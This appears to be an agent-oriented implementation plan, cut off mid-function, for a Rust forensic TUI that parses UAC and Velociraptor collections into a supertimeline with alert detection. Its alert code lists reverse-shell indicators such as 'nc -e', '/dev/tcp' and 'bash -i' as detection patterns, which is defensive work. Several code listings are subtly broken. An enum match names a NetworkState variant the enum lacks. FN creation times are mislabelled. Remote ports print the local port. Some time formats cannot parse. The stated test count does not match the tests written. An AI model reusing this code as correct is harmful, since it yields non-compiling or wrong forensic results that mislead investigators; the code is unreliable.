# Investigation Workbench TUI Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Extend `rt-nav` to open forensic collection archives (UAC `.tar.gz` and Velociraptor `.zip`) directly, parse all artifacts, build a unified supertimeline from all timestamped data, and present an interactive investigation workbench TUI with dashboard, supertimeline, MFT tree, and artifact drill-in views.

**Architecture:** When `rt-nav` receives a collection archive, it probes with `rt_unpack`, extracts to a temp dir, parses all categories into typed structs, converts all timestamped data into a unified `Vec<TimelineEvent>` supertimeline, detects alerts, and launches a `WorkbenchApp` TUI. The supertimeline merges bodyfile timestamps, MFT SI/FN timestamps, USN journal records, login/logout times, process start times, and acquisition-time observations. Artifact data (network, processes, logins, packages, configs, hashes, chkrootkit) also has dedicated drill-in views. For Velociraptor collections, the existing MFT tree view is available via delegation to the existing `App`/`ui::draw()`.

**Tech Stack:** Rust, ratatui 0.29, crossterm, rt-unpack, rt-parser-uac, rt-parser-velociraptor, inventory, chrono, anyhow, clap

**Spec:** `docs/superpowers/specs/2026-03-28-investigation-workbench-design.md`

## File Structure

### New files

```
crates/rt-navigator/src/investigation/
  mod.rs           — WorkbenchApp state machine + handle_key + view cycling
  data.rs          — InvestigationData struct + CollectionMetadata + load_from_extracted()
  timeline.rs      — TimelineEvent + TimelineSource + TimestampType + conversion functions
  alerts.rs        — Alert/AlertSeverity + detect_alerts()
  dashboard.rs     — draw_dashboard() rendering (summary + sparkline + alerts)
  detail.rs        — draw_detail() rendering (right-side panel, varies by view)
  views/
    mod.rs         — WorkbenchView enum + draw_view() dispatch
    supertimeline.rs — draw_supertimeline_view() with source filtering
    network.rs     — draw_network_view() for connections
    process.rs     — draw_process_view() for processes + crontabs
    logins.rs      — draw_logins_view() for login records
    packages.rs    — draw_packages_view() for installed packages
    configs.rs     — draw_configs_view() for config files
    hashes.rs      — draw_hashes_view() for executable hashes
    chkrootkit.rs  — draw_chkrootkit_view() for rootkit findings
```

### Modified files

| File | Change |
|------|--------|
| `crates/rt-navigator/Cargo.toml` | Add rt-unpack, rt-parser-uac, rt-parser-velociraptor, inventory deps |
| `crates/rt-navigator/src/main.rs` | Add collection detection branch, `run_workbench_loop()`, extern crate declarations, `mod investigation` |

### Existing files (untouched)

- `app.rs` — reused as-is when MftTree view is active
- `ui.rs` — reused as-is when MftTree view is active
- `search.rs` — reused as-is
- `sources.rs` — reused for Velociraptor MFT source resolution

---

## Task 1: TimelineEvent Types + Conversion Functions

**Files:**
- Create: `crates/rt-navigator/src/investigation/timeline.rs`
- Modify: `crates/rt-navigator/Cargo.toml`

This task establishes the core supertimeline data model — all other tasks depend on it.

- [ ] **Step 1: Add dependencies to Cargo.toml**

```toml
[dependencies]
rt-mft-tree = { workspace = true }
chrono = { workspace = true }
clap = { workspace = true }
anyhow = { workspace = true }
ratatui = { workspace = true }
crossterm = { workspace = true }
indicatif = { workspace = true }
rt-parser-usnjrnl = { workspace = true }
rt-signatures = { workspace = true, features = ["heuristics"] }
shrinkpath = { workspace = true }
rt-unpack = { workspace = true }
rt-parser-uac = { workspace = true }
rt-parser-velociraptor = { workspace = true }
inventory = { workspace = true }
```

- [ ] **Step 2: Write failing tests for TimelineEvent conversion**

Create `crates/rt-navigator/src/investigation/timeline.rs`:

```rust
use std::collections::HashSet;

/// A single event in the unified supertimeline.
#[derive(Debug, Clone)]
pub struct TimelineEvent {
    /// UTC timestamp (Unix seconds).
    pub timestamp: i64,
    /// What kind of timestamp this is.
    pub timestamp_type: TimestampType,
    /// Source that produced this event.
    pub source: TimelineSource,
    /// File path or entity name.
    pub path: String,
    /// Human-readable description.
    pub description: String,
    /// Optional extra metadata (size, permissions, etc.)
    pub extra: String,
}

/// Classification of what the timestamp represents.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TimestampType {
    Modified,
    Accessed,
    Changed,
    Created,
    FnModified,
    FnAccessed,
    FnChanged,
    UsnChange,
    LoginTime,
    LogoutTime,
    ProcessStart,
    RegLastWrite,
    EventLog,
}

impl TimestampType {
    pub fn label(self) -> &'static str {
        match self {
            Self::Modified => "M",
            Self::Accessed => "A",
            Self::Changed => "C",
            Self::Created => "B",
            Self::FnModified => "FM",
            Self::FnAccessed => "FA",
            Self::FnChanged => "FC",
            Self::UsnChange => "U",
            Self::LoginTime => "In",
            Self::LogoutTime => "Out",
            Self::ProcessStart => "PS",
            Self::RegLastWrite => "RW",
            Self::EventLog => "EL",
        }
    }
}

/// Which parser/artifact produced this event.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum TimelineSource {
    Bodyfile,
    MftSi,
    MftFn,
    UsnJournal,
    LoginHistory,
    ProcessList,
    Registry,
    EventLog,
}

impl TimelineSource {
    pub fn label(self) -> &'static str {
        match self {
            Self::Bodyfile => "BF",
            Self::MftSi => "SI",
            Self::MftFn => "FN",
            Self::UsnJournal => "USN",
            Self::LoginHistory => "LI",
            Self::ProcessList => "PS",
            Self::NetworkState => "NET",
            Self::Registry => "REG",
            Self::EventLog => "EL",
        }
    }

    /// All known source variants for building default filter sets.
    pub fn all() -> HashSet<Self> {
        HashSet::from([
            Self::Bodyfile,
            Self::MftSi,
            Self::MftFn,
            Self::UsnJournal,
            Self::LoginHistory,
            Self::ProcessList,
            Self::Registry,
            Self::EventLog,
        ])
    }
}

// ---------------------------------------------------------------------------
// Conversion: BodyfileEntry → TimelineEvents
// ---------------------------------------------------------------------------

use rt_parser_uac::parsers::bodyfile::BodyfileEntry;

/// Convert a slice of bodyfile entries into timeline events.
/// Produces up to 4 events per entry (mtime, atime, ctime, crtime) when non-zero.
pub fn bodyfile_to_events(entries: &[BodyfileEntry]) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for entry in entries {
        let macros = [
            (entry.mtime, TimestampType::Modified),
            (entry.atime, TimestampType::Accessed),
            (entry.ctime, TimestampType::Changed),
            (entry.crtime, TimestampType::Created),
        ];
        for (ts_opt, ts_type) in macros {
            if let Some(ts) = ts_opt {
                if ts != 0 {
                    events.push(TimelineEvent {
                        timestamp: ts,
                        timestamp_type: ts_type,
                        source: TimelineSource::Bodyfile,
                        path: entry.path.clone(),
                        description: format!("{} {}", ts_type.label(), &entry.path),
                        extra: format!("size={} mode={:o}", entry.size, entry.mode),
                    });
                }
            }
        }
    }
    events
}

// ---------------------------------------------------------------------------
// Conversion: LoginRecord → TimelineEvents
// ---------------------------------------------------------------------------

use rt_parser_uac::parsers::system::LoginRecord;

/// Convert login records into timeline events.
/// Produces up to 2 events per record (login, logout) when timestamps are parseable.
pub fn logins_to_events(records: &[LoginRecord], acquisition_time: i64) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for record in records {
        if let Some(ref time_str) = record.login_time {
            if let Ok(ts) = parse_login_time(time_str, acquisition_time) {
                events.push(TimelineEvent {
                    timestamp: ts,
                    timestamp_type: TimestampType::LoginTime,
                    source: TimelineSource::LoginHistory,
                    path: record.user.clone().unwrap_or_default(),
                    description: format!(
                        "Login: {} from {} on {}",
                        record.user.as_deref().unwrap_or("?"),
                        record.from.as_deref().unwrap_or("?"),
                        record.terminal.as_deref().unwrap_or("?"),
                    ),
                    extra: format!(
                        "duration={}",
                        record.duration.as_deref().unwrap_or("?")
                    ),
                });
            }
        }
        if let Some(ref time_str) = record.logout_time {
            if let Ok(ts) = parse_login_time(time_str, acquisition_time) {
                events.push(TimelineEvent {
                    timestamp: ts,
                    timestamp_type: TimestampType::LogoutTime,
                    source: TimelineSource::LoginHistory,
                    path: record.user.clone().unwrap_or_default(),
                    description: format!(
                        "Logout: {} from {}",
                        record.user.as_deref().unwrap_or("?"),
                        record.terminal.as_deref().unwrap_or("?"),
                    ),
                    extra: String::new(),
                });
            }
        }
    }
    events
}

// ---------------------------------------------------------------------------
// Conversion: ProcessInfo → TimelineEvents
// ---------------------------------------------------------------------------

use rt_parser_uac::parsers::process::ProcessInfo;

/// Convert process list into timeline events.
/// Only processes with a parseable start_time get a ProcessStart event.
/// Processes without start_time do NOT generate timeline events — they
/// live only in the Processes drill-in view.
pub fn processes_to_events(procs: &[ProcessInfo]) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for proc in procs {
        if let Some(ref start_str) = proc.start_time {
            // Try parsing the start time (ps formats vary: "Mar24", "19:38", "2026")
            if let Ok(ts) = parse_ps_start_time(start_str) {
                events.push(TimelineEvent {
                    timestamp: ts,
                    timestamp_type: TimestampType::ProcessStart,
                    source: TimelineSource::ProcessList,
                    path: proc.command.clone(),
                    description: format!(
                        "Process started: {} (PID {})",
                        proc.command,
                        proc.pid.as_deref().unwrap_or("?"),
                    ),
                    extra: format!(
                        "user={} cpu={}% mem={}%",
                        proc.user.as_deref().unwrap_or("?"),
                        proc.cpu.as_deref().unwrap_or("?"),
                        proc.mem.as_deref().unwrap_or("?"),
                    ),
                });
            }
        }
    }
    events
}

/// Best-effort parse of ps STARTED/STIME column.
/// Formats vary: "Mar24", "19:38", "2026", "Mar 24 19:38".
fn parse_ps_start_time(s: &str) -> Result<i64, ()> {
    use chrono::NaiveDateTime;
    let formats = [
        "%b%d",          // "Mar24"
        "%H:%M",         // "19:38"
        "%b %d %H:%M",   // "Mar 24 19:38"
    ];
    for fmt in &formats {
        if let Ok(ndt) = NaiveDateTime::parse_from_str(s.trim(), fmt) {
            return Ok(ndt.and_utc().timestamp());
        }
    }
    Err(())
}

// ---------------------------------------------------------------------------
// Conversion: MFT FileNode → TimelineEvents
// ---------------------------------------------------------------------------

use rt_mft_tree::tree::FileTree;

/// Convert MFT tree nodes into timeline events.
/// Produces up to 8 events per node (4 SI + 4 FN timestamps).
pub fn mft_to_events(tree: &FileTree) -> Vec<TimelineEvent> {
    let mut events = Vec::new();
    for idx in 0..tree.node_count() {
        let node = tree.node(idx);
        let path = tree.full_path(idx);

        // SI timestamps (always present)
        let si = &node.si_timestamps;
        let si_entries = [
            (si.modified.timestamp(), TimestampType::Modified),
            (si.accessed.timestamp(), TimestampType::Accessed),
            (si.entry_modified.timestamp(), TimestampType::Changed),
            (si.created.timestamp(), TimestampType::Created),
        ];
        for (ts, ts_type) in si_entries {
            if ts != 0 {
                events.push(TimelineEvent {
                    timestamp: ts,
                    timestamp_type: ts_type,
                    source: TimelineSource::MftSi,
                    path: path.clone(),
                    description: format!("SI {} {}", ts_type.label(), path),
                    extra: format!("size={} dir={}", node.size, node.is_dir),
                });
            }
        }

        // FN timestamps (optional)
        if let Some(ref fn_ts) = node.fn_timestamps {
            let fn_entries = [
                (fn_ts.modified.timestamp(), TimestampType::FnModified),
                (fn_ts.accessed.timestamp(), TimestampType::FnAccessed),
                (fn_ts.entry_modified.timestamp(), TimestampType::FnChanged),
                (fn_ts.created.timestamp(), TimestampType::Created),
            ];
            for (ts, ts_type) in fn_entries {
                if ts != 0 {
                    events.push(TimelineEvent {
                        timestamp: ts,
                        timestamp_type: ts_type,
                        source: TimelineSource::MftFn,
                        path: path.clone(),
                        description: format!("FN {} {}", ts_type.label(), path),
                        extra: String::new(),
                    });
                }
            }
        }
    }
    events
}

// ---------------------------------------------------------------------------
// Conversion: UsnRecordV2 → TimelineEvents
// ---------------------------------------------------------------------------

use rt_parser_usnjrnl::UsnRecordV2;

/// Convert USN journal records into timeline events.
pub fn usn_to_events(records: &[UsnRecordV2]) -> Vec<TimelineEvent> {
    records
        .iter()
        .map(|rec| {
            // USN timestamp is Windows FILETIME (100ns ticks since 1601-01-01).
            // Convert to Unix seconds.
            let unix_ts = (rec.timestamp / 10_000_000) - 11_644_473_600;
            TimelineEvent {
                timestamp: unix_ts,
                timestamp_type: TimestampType::UsnChange,
                source: TimelineSource::UsnJournal,
                path: rec.file_name.clone(),
                description: format!(
                    "USN: {} reason=0x{:08x}",
                    rec.file_name, rec.reason.bits()
                ),
                extra: format!(
                    "frn=0x{:012x} parent=0x{:012x}",
                    rec.file_reference_number & 0x0000_FFFF_FFFF_FFFF,
                    rec.parent_file_reference_number & 0x0000_FFFF_FFFF_FFFF,
                ),
            }
        })
        .collect()
}

// ---------------------------------------------------------------------------
// Sparkline builder
// ---------------------------------------------------------------------------

/// Build sparkline data by bucketing timeline event timestamps into `width` bins.
/// Returns a Vec of counts suitable for `ratatui::widgets::Sparkline`.
pub fn build_sparkline(events: &[TimelineEvent], width: usize) -> Vec<u64> {
    if events.is_empty() || width == 0 {
        return vec![0; width];
    }

    let min_ts = events.iter().map(|e| e.timestamp).min().unwrap_or(0);
    let max_ts = events.iter().map(|e| e.timestamp).max().unwrap_or(0);

    if min_ts == max_ts {
        let mut bins = vec![0u64; width];
        bins[width / 2] = events.len() as u64;
        return bins;
    }

    let range = (max_ts - min_ts) as f64;
    let mut bins = vec![0u64; width];
    for event in events {
        let normalized = ((event.timestamp - min_ts) as f64 / range * (width - 1) as f64) as usize;
        let bucket = normalized.min(width - 1);
        bins[bucket] += 1;
    }
    bins
}

// ---------------------------------------------------------------------------
// Helper: parse login timestamp string
// ---------------------------------------------------------------------------

/// Best-effort parse of `last` output timestamps like "Mon Mar 24 19:38"
/// or "Mon Mar 24 19:38:07 +0800 2026". Returns Unix timestamp.
fn parse_login_time(s: &str, _fallback_year: i64) -> Result<i64, ()> {
    // Try common formats from `last` output
    use chrono::NaiveDateTime;
    let formats = [
        "%a %b %d %H:%M:%S %z %Y",  // "Mon Mar 24 19:38:07 +0800 2026"
        "%a %b %d %H:%M:%S %Y",      // "Mon Mar 24 19:38:07 2026"
        "%a %b %d %H:%M %Y",         // "Mon Mar 24 19:38 2026"
        "%Y-%m-%dT%H:%M:%S",         // ISO 8601
    ];
    for fmt in &formats {
        if let Ok(dt) = chrono::DateTime::parse_from_str(s.trim(), fmt) {
            return Ok(dt.timestamp());
        }
    }
    // Try NaiveDateTime (no timezone)
    let naive_formats = [
        "%a %b %d %H:%M:%S %Y",
        "%a %b %d %H:%M %Y",
    ];
    for fmt in &naive_formats {
        if let Ok(ndt) = NaiveDateTime::parse_from_str(s.trim(), fmt) {
            return Ok(ndt.and_utc().timestamp());
        }
    }
    Err(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_bodyfile_to_events_basic() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/bin/ls".to_string(),
            inode: 1,
            mode: 0o100755,
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1000),
            mtime: Some(2000),
            ctime: Some(3000),
            crtime: Some(0), // zero → skipped
        }];
        let events = bodyfile_to_events(&entries);
        assert_eq!(events.len(), 3); // mtime, atime, ctime (crtime=0 skipped)
        assert!(events.iter().all(|e| e.source == TimelineSource::Bodyfile));
        assert_eq!(events[0].timestamp, 2000); // mtime first
        assert_eq!(events[1].timestamp, 1000); // atime second
    }

    #[test]
    fn test_bodyfile_to_events_empty() {
        let events = bodyfile_to_events(&[]);
        assert!(events.is_empty());
    }

    #[test]
    fn test_bodyfile_to_events_all_none() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/nothing".to_string(),
            inode: 0,
            mode: 0,
            uid: 0,
            gid: 0,
            size: 0,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let events = bodyfile_to_events(&entries);
        assert!(events.is_empty());
    }

    #[test]
    fn test_processes_to_events_no_start_time() {
        let procs = vec![ProcessInfo {
            user: Some("root".to_string()),
            pid: Some("1".to_string()),
            cpu: Some("0.0".to_string()),
            mem: Some("0.1".to_string()),
            tty: Some("?".to_string()),
            start_time: None,
            command: "/sbin/init".to_string(),
        }];
        // No start_time → no timeline events (lives only in drill-in view)
        let events = processes_to_events(&procs);
        assert!(events.is_empty());
    }

    #[test]
    fn test_sparkline_empty() {
        let bins = build_sparkline(&[], 10);
        assert_eq!(bins.len(), 10);
        assert!(bins.iter().all(|&b| b == 0));
    }

    #[test]
    fn test_sparkline_single_event() {
        let events = vec![TimelineEvent {
            timestamp: 1000,
            timestamp_type: TimestampType::Modified,
            source: TimelineSource::Bodyfile,
            path: String::new(),
            description: String::new(),
            extra: String::new(),
        }];
        let bins = build_sparkline(&events, 10);
        assert_eq!(bins.len(), 10);
        assert_eq!(bins.iter().sum::<u64>(), 1);
    }

    #[test]
    fn test_sparkline_distribution() {
        let events: Vec<TimelineEvent> = (0..100)
            .map(|i| TimelineEvent {
                timestamp: i * 10,
                timestamp_type: TimestampType::Modified,
                source: TimelineSource::Bodyfile,
                path: String::new(),
                description: String::new(),
                extra: String::new(),
            })
            .collect();
        let bins = build_sparkline(&events, 10);
        assert_eq!(bins.len(), 10);
        assert_eq!(bins.iter().sum::<u64>(), 100);
    }

    #[test]
    fn test_timeline_source_all() {
        let all = TimelineSource::all();
        assert_eq!(all.len(), 8);
        assert!(all.contains(&TimelineSource::Bodyfile));
        assert!(all.contains(&TimelineSource::UsnJournal));
    }

    #[test]
    fn test_usn_to_events() {
        use rt_parser_usnjrnl::UsnReasonFlags;
        let records = vec![UsnRecordV2 {
            record_length: 80,
            major_version: 2,
            minor_version: 0,
            file_reference_number: 0x0000_0000_0000_1234,
            parent_file_reference_number: 0x0000_0000_0000_0005,
            usn: 12345,
            timestamp: 132_500_000_000_000_000, // Windows FILETIME
            reason: UsnReasonFlags::from_bits_truncate(0x100), // DATA_EXTEND
            source_info: 0,
            security_id: 0,
            file_attributes: 0x20,
            file_name: "test.txt".to_string(),
        }];
        let events = usn_to_events(&records);
        assert_eq!(events.len(), 1);
        assert_eq!(events[0].source, TimelineSource::UsnJournal);
        assert_eq!(events[0].timestamp_type, TimestampType::UsnChange);
        assert!(events[0].timestamp > 0);
    }
}
```

- [ ] **Step 3: Create the investigation module stub**

Create `crates/rt-navigator/src/investigation/mod.rs`:

```rust
pub mod timeline;
```

- [ ] **Step 4: Register the module in main.rs**

In `crates/rt-navigator/src/main.rs`, add after `mod ui;`:

```rust
mod investigation;
```

- [ ] **Step 5: Run tests to verify**

Run: `cargo test -p rt-navigator --lib -- investigation::timeline`
Expected: All 8 tests PASS (bodyfile conversion, network, processes, sparkline, USN, source::all)

- [ ] **Step 6: Commit**

```bash
git add crates/rt-navigator/
git commit -m "feat(nav): add TimelineEvent types and conversion functions for supertimeline"
```

---

## Task 2: InvestigationData + CollectionMetadata + Alert Detection

**Files:**
- Create: `crates/rt-navigator/src/investigation/data.rs`
- Create: `crates/rt-navigator/src/investigation/alerts.rs`
- Modify: `crates/rt-navigator/src/investigation/mod.rs`

- [ ] **Step 1: Write data.rs with InvestigationData and loading logic**

Create `crates/rt-navigator/src/investigation/data.rs`:

```rust
use std::path::Path;

use rt_mft_tree::tree::FileTree;
use rt_parser_uac::parsers::bodyfile::BodyfileEntry;
use rt_parser_uac::parsers::chkrootkit::ChkrootkitFinding;
use rt_parser_uac::parsers::configs::ConfigFile;
use rt_parser_uac::parsers::hash_execs::HashedExecutable;
use rt_parser_uac::parsers::network::NetworkConnection;
use rt_parser_uac::parsers::packages::InstalledPackage;
use rt_parser_uac::parsers::process::{CrontabEntry, ProcessInfo};
use rt_parser_uac::parsers::system::LoginRecord;
use rt_signatures::heuristics::AnomalyIndex;

use super::alerts::Alert;
use super::timeline::TimelineEvent;

/// Metadata about the collection being investigated.
#[derive(Debug, Clone)]
pub struct CollectionMetadata {
    pub hostname: String,
    pub os: String,
    pub collection_tool: String,
    pub acquisition_time: i64,
}

impl Default for CollectionMetadata {
    fn default() -> Self {
        Self {
            hostname: "unknown".to_string(),
            os: "unknown".to_string(),
            collection_tool: "unknown".to_string(),
            acquisition_time: 0,
        }
    }
}

/// All parsed data from a collection, held in memory.
pub struct InvestigationData {
    pub metadata: CollectionMetadata,
    pub alerts: Vec<Alert>,

    // Unified supertimeline (all temporal data merged + sorted)
    pub timeline: Vec<TimelineEvent>,

    // MFT tree (present for Velociraptor, absent for UAC)
    pub mft_tree: Option<FileTree>,
    pub anomaly_index: Option<AnomalyIndex>,

    // Artifact data (also in drill-in views)
    pub network: Vec<NetworkConnection>,
    pub processes: Vec<ProcessInfo>,
    pub crontabs: Vec<CrontabEntry>,
    pub logins: Vec<LoginRecord>,
    pub packages: Vec<InstalledPackage>,
    pub hashes: Vec<HashedExecutable>,
    pub chkrootkit: Vec<ChkrootkitFinding>,
    pub configs: Vec<ConfigFile>,
}

impl InvestigationData {
    /// Count of timeline events by source, for the dashboard summary.
    pub fn timeline_source_counts(&self) -> Vec<(&'static str, usize)> {
        use super::timeline::TimelineSource;
        let sources = [
            TimelineSource::Bodyfile,
            TimelineSource::MftSi,
            TimelineSource::MftFn,
            TimelineSource::UsnJournal,
            TimelineSource::LoginHistory,
            TimelineSource::ProcessList,
        ];
        sources
            .iter()
            .filter_map(|&src| {
                let count = self.timeline.iter().filter(|e| e.source == src).count();
                if count > 0 {
                    Some((src.label(), count))
                } else {
                    None
                }
            })
            .collect()
    }
}

/// Load an `InvestigationData` from an extracted UAC collection directory.
///
/// Parses all UAC categories, converts timestamped data to supertimeline events,
/// runs alert detection, and returns the populated struct.
pub fn load_uac_collection(extracted_root: &Path) -> InvestigationData {
    use rt_parser_uac::parsers::{
        bodyfile, chkrootkit, configs, hash_execs, network, packages, process, system,
    };
    use super::alerts;
    use super::timeline::{
        bodyfile_to_events, logins_to_events, processes_to_events,
    };

    // Parse metadata from directory name (e.g., "uac-vbox-linux-20260324193807")
    let metadata = parse_uac_metadata(extracted_root);
    let acq_time = metadata.acquisition_time;

    // Parse bodyfile
    let bf_path = extracted_root.join("bodyfile/bodyfile.txt");
    let bodyfile_entries: Vec<BodyfileEntry> = if bf_path.exists() {
        bodyfile::parse_bodyfile_path(&bf_path).unwrap_or_default()
    } else {
        Vec::new()
    };

    // Parse network
    let net_dir = extracted_root.join("live_response/network");
    let network_conns: Vec<NetworkConnection> = if net_dir.is_dir() {
        network::parse_network_dir(&net_dir)
    } else {
        Vec::new()
    };

    // Parse processes
    let mut all_procs = Vec::new();
    for name in &["ps_auxwww.txt", "ps-auxwww.txt", "ps.txt"] {
        let path = extracted_root.join("live_response/process").join(name);
        if let Ok(content) = std::fs::read_to_string(&path) {
            all_procs.extend(process::parse_ps_output(&content));
        }
    }

    // Parse crontabs
    let mut crontabs = Vec::new();
    let crontab_dir = extracted_root.join("live_response/process");
    for name in &["crontab.txt", "crontab-l.txt"] {
        let path = crontab_dir.join(name);
        if let Ok(content) = std::fs::read_to_string(&path) {
            crontabs.extend(process::parse_crontab(&content, "root"));
        }
    }

    // Parse logins
    let mut logins = Vec::new();
    for name in &["last.txt", "last-a.txt"] {
        let path = extracted_root.join("live_response/system").join(name);
        if let Ok(content) = std::fs::read_to_string(&path) {
            logins.extend(system::parse_last_output(&content));
        }
    }

    // Parse packages
    let pkg_dir = extracted_root.join("live_response/packages");
    let packages: Vec<InstalledPackage> = if pkg_dir.is_dir() {
        packages::parse_packages_dir(&pkg_dir)
    } else {
        Vec::new()
    };

    // Parse hashes
    let hash_dir = extracted_root.join("hash_executables");
    let hashes: Vec<HashedExecutable> = if hash_dir.is_dir() {
        hash_execs::parse_hash_dir(&hash_dir)
    } else {
        Vec::new()
    };

    // Parse chkrootkit
    let chk_path = extracted_root.join("chkrootkit/chkrootkit.log");
    let chkrootkit_findings: Vec<ChkrootkitFinding> =
        if let Ok(content) = std::fs::read_to_string(&chk_path) {
            chkrootkit::parse_chkrootkit_log(&content)
        } else {
            Vec::new()
        };

    // Parse configs
    let sys_dir = extracted_root.join("system");
    let config_files: Vec<ConfigFile> = if sys_dir.is_dir() {
        configs::collect_configs(&sys_dir)
    } else {
        Vec::new()
    };

    // Build supertimeline from all timestamped sources
    let mut timeline = Vec::new();
    timeline.extend(bodyfile_to_events(&bodyfile_entries));
    timeline.extend(logins_to_events(&logins, acq_time));
    timeline.extend(processes_to_events(&all_procs));
    // Sort chronologically
    timeline.sort_by_key(|e| e.timestamp);

    // Run alert detection on raw data before we discard bodyfile entries
    let alert_data = alerts::AlertInput {
        bodyfile: &bodyfile_entries,
        network: &network_conns,
        processes: &all_procs,
        crontabs: &crontabs,
        chkrootkit: &chkrootkit_findings,
        configs: &config_files,
    };
    let detected_alerts = alerts::detect_alerts(&alert_data);

    InvestigationData {
        metadata,
        alerts: detected_alerts,
        timeline,
        mft_tree: None,
        anomaly_index: None,
        network: network_conns,
        processes: all_procs,
        crontabs,
        logins,
        packages,
        hashes: hashes,
        chkrootkit: chkrootkit_findings,
        configs: config_files,
    }
}

/// Parse UAC metadata from the extracted directory name.
/// Format: `uac-<hostname>-<YYYYMMDDHHMMSS>` or similar.
fn parse_uac_metadata(path: &Path) -> CollectionMetadata {
    let dirname = path
        .file_name()
        .and_then(|n| n.to_str())
        .unwrap_or("unknown");

    // Try to extract hostname and timestamp from "uac-HOSTNAME-YYYYMMDDHHMMSS"
    let parts: Vec<&str> = dirname.splitn(3, '-').collect();
    let (hostname, acq_time) = if parts.len() >= 3 && parts[0] == "uac" {
        let hostname = parts[1].to_string();
        let ts_str = parts[2];
        // Parse YYYYMMDDHHMMSS
        let acq = chrono::NaiveDateTime::parse_from_str(ts_str, "%Y%m%d%H%M%S")
            .map(|ndt| ndt.and_utc().timestamp())
            .unwrap_or(0);
        (hostname, acq)
    } else {
        (dirname.to_string(), 0)
    };

    CollectionMetadata {
        hostname,
        os: "Linux".to_string(),
        collection_tool: "UAC".to_string(),
        acquisition_time: acq_time,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_uac_metadata() {
        let path = Path::new("/tmp/uac-vbox-linux-20260324193807");
        let meta = parse_uac_metadata(path);
        assert_eq!(meta.hostname, "vbox");
        // Note: "linux-20260324193807" is the third part due to splitn(3, '-')
        // This needs adjustment — see below.
    }

    #[test]
    fn test_parse_uac_metadata_unknown() {
        let path = Path::new("/tmp/something");
        let meta = parse_uac_metadata(path);
        assert_eq!(meta.hostname, "something");
        assert_eq!(meta.acquisition_time, 0);
    }

    #[test]
    fn test_load_uac_collection_empty_dir() {
        let dir = tempfile::tempdir().expect("tmpdir");
        let data = load_uac_collection(dir.path());
        assert!(data.timeline.is_empty());
        assert!(data.network.is_empty());
        assert!(data.processes.is_empty());
    }

    #[test]
    fn test_timeline_source_counts_empty() {
        let data = InvestigationData {
            metadata: CollectionMetadata::default(),
            alerts: Vec::new(),
            timeline: Vec::new(),
            mft_tree: None,
            anomaly_index: None,
            network: Vec::new(),
            processes: Vec::new(),
            crontabs: Vec::new(),
            logins: Vec::new(),
            packages: Vec::new(),
            hashes: Vec::new(),
            chkrootkit: Vec::new(),
            configs: Vec::new(),
        };
        assert!(data.timeline_source_counts().is_empty());
    }
}
```

- [ ] **Step 2: Write alerts.rs with pattern-matching detection**

Create `crates/rt-navigator/src/investigation/alerts.rs`:

```rust
use rt_parser_uac::parsers::bodyfile::BodyfileEntry;
use rt_parser_uac::parsers::chkrootkit::ChkrootkitFinding;
use rt_parser_uac::parsers::configs::ConfigFile;
use rt_parser_uac::parsers::network::NetworkConnection;
use rt_parser_uac::parsers::process::{CrontabEntry, ProcessInfo};

/// Severity levels for detected alerts.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AlertSeverity {
    Critical,
    Warning,
    Info,
}

impl AlertSeverity {
    pub fn label(self) -> &'static str {
        match self {
            Self::Critical => "[!]",
            Self::Warning => "[w]",
            Self::Info => "[i]",
        }
    }
}

/// A detected alert / suspicious finding.
#[derive(Debug, Clone)]
pub struct Alert {
    pub severity: AlertSeverity,
    pub category: String,
    pub message: String,
    pub detail: String,
}

/// Input data for alert detection (borrowed slices from parsed data).
pub struct AlertInput<'a> {
    pub bodyfile: &'a [BodyfileEntry],
    pub network: &'a [NetworkConnection],
    pub processes: &'a [ProcessInfo],
    pub crontabs: &'a [CrontabEntry],
    pub chkrootkit: &'a [ChkrootkitFinding],
    pub configs: &'a [ConfigFile],
}

/// Run all alert detection checks. Returns detected alerts sorted by severity.
pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
    let mut alerts = Vec::new();

    check_network_alerts(input.network, &mut alerts);
    check_process_alerts(input.processes, &mut alerts);
    check_chkrootkit_alerts(input.chkrootkit, &mut alerts);
    check_config_alerts(input.configs, input.crontabs, &mut alerts);
    check_bodyfile_alerts(input.bodyfile, &mut alerts);

    // Sort: Critical first, then Warning, then Info
    alerts.sort_by_key(|a| match a.severity {
        AlertSeverity::Critical => 0,
        AlertSeverity::Warning => 1,
        AlertSeverity::Info => 2,
    });

    alerts
}

fn check_network_alerts(conns: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    for conn in conns {
        let remote = conn.remote_address.as_deref().unwrap_or("");
        // Non-RFC1918 external connections (skip *, 0.0.0.0, 127.x, 10.x, 172.16-31.x, 192.168.x)
        if !remote.is_empty()
            && remote != "*"
            && remote != "0.0.0.0"
            && !remote.starts_with("127.")
            && !remote.starts_with("10.")
            && !remote.starts_with("192.168.")
            && !remote.starts_with("::")
            && !is_rfc1918_172(remote)
        {
            alerts.push(Alert {
                severity: AlertSeverity::Warning,
                category: "Network".to_string(),
                message: format!("Non-RFC1918 connection to {remote}"),
                detail: format!(
                    "{}:{} → {}:{} ({})",
                    conn.local_address.as_deref().unwrap_or("?"),
                    conn.local_port.as_deref().unwrap_or("?"),
                    remote,
                    conn.local_port.as_deref().unwrap_or("?"),
                    conn.state.as_deref().unwrap_or("?"),
                ),
            });
        }
    }
}

fn check_process_alerts(procs: &[ProcessInfo], alerts: &mut Vec<Alert>) {
    let suspicious_paths = ["/tmp/", "/dev/shm/", "/var/tmp/"];
    let shell_patterns = ["pty.spawn", "nc -e", "/dev/tcp", "bash -i", "ncat"];

    for proc in procs {
        let cmd = &proc.command;

        // Process running from suspicious path
        for path in &suspicious_paths {
            if cmd.contains(path) {
